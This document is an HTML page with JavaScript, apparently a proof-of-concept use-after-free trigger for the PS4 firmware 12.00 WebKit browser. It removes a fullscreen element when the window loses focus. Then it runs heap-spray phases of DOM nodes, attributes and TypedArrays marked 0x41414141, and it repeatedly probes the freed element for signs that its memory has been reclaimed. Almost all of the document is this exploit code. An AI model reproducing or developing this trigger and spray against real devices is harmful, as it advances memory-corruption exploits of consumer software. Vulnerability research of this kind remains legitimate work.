<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim (Hybrid + Safe Log)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Aggressive Reclaim (Hybrid)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// 🔒 LOG SEGURO (fora do DOM)
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 AGGRESSIVE RECLAIM (COM TYPEDARRAY)
// ==========================
function aggressiveReclaim() {
    log("[*] Aggressive reclaim iniciado");

    let bucket = [];

    // Fase 1 — churn
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // Fase 2 — Element spray
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.innerHTML = "REUSE_EL_" + i;
        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 NOVO: TypedArray spray (controle de memória)
    for (let i = 0; i < 10000; i++) {
        let buf = new ArrayBuffer(0x100);
        let view = new Uint32Array(buf);
        view[0] = 0x41414141; // marcador
        bucket.push(view);
    }

    // Fase 3 — TextNode
    for (let i = 0; i < 10000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    // Fase 4 — Attribute
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(el);
        bucket.push(el);
    }

    // Fase 5 — churn final
    for (let i = 0; i < 5000; i++) {
        let el = document.createElement("span");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Aggressive reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO EXPANDIDA
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try { log("[CHECK] innerHTML = " + fsTarget.innerHTML); }
    catch(e) { log("[UAF] innerHTML erro"); }

    try { log("[CHECK] outerHTML = " + fsTarget.outerHTML); }
    catch(e) { log("[UAF] outerHTML erro"); }

    try { log("[CHECK] childNodes = " + fsTarget.childNodes.length); }
    catch(e) { log("[UAF] childNodes erro"); }

    try { log("[CHECK] firstChild = " + fsTarget.firstChild); }
    catch(e) { log("[UAF] firstChild erro"); }

    try { log("[CHECK] data-x = " + fsTarget.getAttribute("data-x")); }
    catch(e) { log("[UAF] attribute erro"); }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // janela crítica
    setTimeout(() => aggressiveReclaim(), 0);
    setTimeout(() => aggressiveReclaim(), 50);
    setTimeout(() => aggressiveReclaim(), 100);

    // checks
    setTimeout(() => checkUAF(fsTarget), 10);
    setTimeout(() => checkUAF(fsTarget), 30);
    setTimeout(() => checkUAF(fsTarget), 60);
    setTimeout(() => checkUAF(fsTarget), 120);
    setTimeout(() => checkUAF(fsTarget), 250);

    // 🔬 dump final seguro
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
